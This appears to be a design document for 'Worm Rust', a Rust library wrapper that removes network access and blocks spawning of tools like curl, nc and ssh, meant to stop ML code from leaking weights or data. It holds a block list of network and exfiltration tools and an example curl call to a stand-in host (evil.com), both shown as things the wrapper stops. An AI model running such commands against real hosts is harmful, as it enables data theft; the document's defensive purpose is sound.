# Worm Rust Design Document

## Overview

**Worm Rust** is a security-hardened Rust distribution designed for safe execution of ML workloads. It provides compile-time network isolation and runtime subprocess filtering to prevent malicious code from exfiltrating data or establishing unauthorized connections.

## Core Principles

1. **Compile-time Network Isolation**: The `std::net` module is not re-exported, causing compile errors if code attempts to use network functionality
2. **Runtime Process Filtering**: `process::Command` blocks dangerous executables (curl, wget, nc, ssh, etc.)
3. **Zero Runtime Overhead**: Security is enforced at compile time where possible
4. **Transparent Drop-in**: Code using `worm_std` instead of `std` gets security guarantees automatically

## Comparison: Worm Rust vs Worm Python

| Feature | Worm Python | Worm Rust |
|---------|-------------|-----------|
| Network Blocking | Runtime import hooks | Compile-time (no `std::net`) |
| Process Filtering | Runtime `subprocess` wrapper | Runtime `Command` wrapper |
| Enforcement | Can be bypassed with `ctypes` | Enforced by type system |
| Overhead | Small runtime overhead | Zero overhead (compile-time) |
| Detection | Runtime errors | Compile errors |

## Architecture

```
worm_std/
├── Cargo.toml
└── src/
    ├── lib.rs         # Re-exports std modules EXCEPT net
    ├── process.rs     # Filtered Command implementation
    └── prelude.rs     # Common imports
```

## Blocked Network Access

The following are NOT available in Worm Rust:

```rust
// These will fail to compile:
use std::net::TcpStream;      // Error: module `net` not found
use std::net::UdpSocket;      // Error: module `net` not found
use worm_std::net::*;         // Error: module `net` not found
```

## Blocked Executables

The `process::Command` wrapper blocks execution of:

- **Network tools**: `curl`, `wget`, `nc`, `netcat`, `ncat`
- **Remote access**: `ssh`, `scp`, `sftp`, `rsync`, `ftp`
- **Network diagnostics**: `ping`, `traceroute`, `nmap`, `dig`, `nslookup`
- **Data exfiltration**: `base64` (when piped to network), `xxd`
- **Package managers** (network-dependent): `pip`, `npm`, `cargo` (optional)

## Usage

### Basic Usage

```rust
// Instead of:
use std::fs::File;
use std::io::Read;

// Use:
use worm_std::fs::File;
use worm_std::io::Read;
```

### Process Spawning

```rust
use worm_std::process::Command;

// This works:
let output = Command::new("ls")
    .arg("-la")
    .output()
    .expect("failed to execute");

// This fails at runtime:
let output = Command::new("curl")  // Error: "curl" is blocked
    .arg("https://evil.com")
    .output();
```

## Security Model

### Threat Model

Worm Rust protects against:
1. **Direct network access**: Blocked at compile time
2. **Network via subprocess**: Blocked at runtime
3. **DNS exfiltration**: Blocked (dig, nslookup filtered)
4. **Reverse shells**: Blocked (nc, ssh filtered)

### Limitations

Worm Rust does NOT protect against:
1. **Unsafe code**: `unsafe` blocks can bypass any Rust safety
2. **FFI calls**: C libraries can still access network
3. **Kernel syscalls**: Direct syscalls bypass std entirely
4. **Covert channels**: Timing attacks, etc.

For complete isolation, combine Worm Rust with:
- Container isolation (Docker, gVisor)
- Seccomp filters
- Network namespace isolation

## Implementation Details

### lib.rs Strategy

```rust
// Re-export everything from std EXCEPT net
pub use std::alloc;
pub use std::any;
pub use std::array;
// ... all other modules ...
// pub use std::net;  // INTENTIONALLY OMITTED
pub use std::num;
pub use std::ops;
// ...

// Custom process module with filtering
pub mod process;
```

### Command Filtering

The `process::Command` wrapper:
1. Maintains same API as `std::process::Command`
2. Checks executable name against blocklist
3. Returns `Err` immediately for blocked commands
4. Delegates to real `std::process::Command` for allowed commands

## Integration with Torus Attention

This Worm Rust implementation is bundled with the Torus Attention library to ensure ML models can be trained and run without risk of:
- Model weights being exfiltrated
- Training data being leaked
- Backdoors establishing C2 channels

## Future Work

1. **Proc-macro for enforcement**: `#[worm_safe]` attribute to verify no unsafe/FFI
2. **Sandboxed async runtime**: Network-free tokio variant
3. **Audit tooling**: Static analysis for security violations
4. **WebAssembly target**: WASM provides even stronger isolation
